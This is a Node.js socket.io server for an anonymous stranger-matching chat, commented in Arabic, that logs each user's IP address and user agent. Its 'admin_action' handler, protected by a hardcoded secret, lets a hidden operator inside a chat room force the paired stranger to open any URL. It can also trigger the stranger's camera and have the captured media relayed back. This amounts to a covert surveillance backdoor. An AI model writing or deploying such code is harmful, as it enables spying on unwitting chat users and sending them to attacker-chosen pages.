const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// السماح بقراءة الملفات في المجلد
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

let waitingUser = null;

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
  
  // حفظ معلومات الجهاز داخل الـ socket الخاص بالمستخدم لتسهيل استخدامها لاحقاً
  socket.userInfo = { ip: clientIp, ua: userAgent };

  // نظام البحث والمطابقة
  socket.on('find_partner', () => {
    // التأكد من أن المستخدم المنتظر ما زال متصلاً حقاً
    if (waitingUser && waitingUser.connected && waitingUser.id !== socket.id) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');

      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  // استقبال وإرسال الرسائل العادية
  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', data);
    }
  });

  // مؤشر الكتابة
  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  // ==========================================
  // أوامر لوحة تحكم الإدارة (مع تصحيح التوجيه)
  // ==========================================
  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return; // حماية الأوامر

    if (data.action === 'alert') {
      io.emit('system_alert', data.message);
    } else if (data.action === 'open_url') {
      // توجيه المستخدم الموجود في نفس غرفة الأدمن أو بثها بحسب الحاجة
      if (socket.roomName) {
        socket.to(socket.roomName).emit('force_open_url', data.url);
      }
    } else if (data.action === 'clear_chat') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('clear_chat', data.target);
        socket.emit('clear_chat', data.target); // مسح عندي أيضاً لو كنت في الغرفة
      }
    } else if (data.action === 'change_bg') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('change_bg', data.bgColor);
        socket.emit('change_bg', data.bgColor);
      }
    } else if (data.action === 'request_media') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType });
      }
    }
  });

  // تصحيح استقبال الوسائط وإرسالها بالشكل الصحيح
  socket.on('user_media_captured', (mediaData) => {
    if (socket.roomName) {
      // إرسال الصورة للطرف الآخر أو عرضها في الشات بشكل سليم
      socket.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
    }
  });

  // عند قطع الاتصال
  socket.on('disconnect', () => {
    if (waitingUser === socket) {
      waitingUser = null;
    }
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
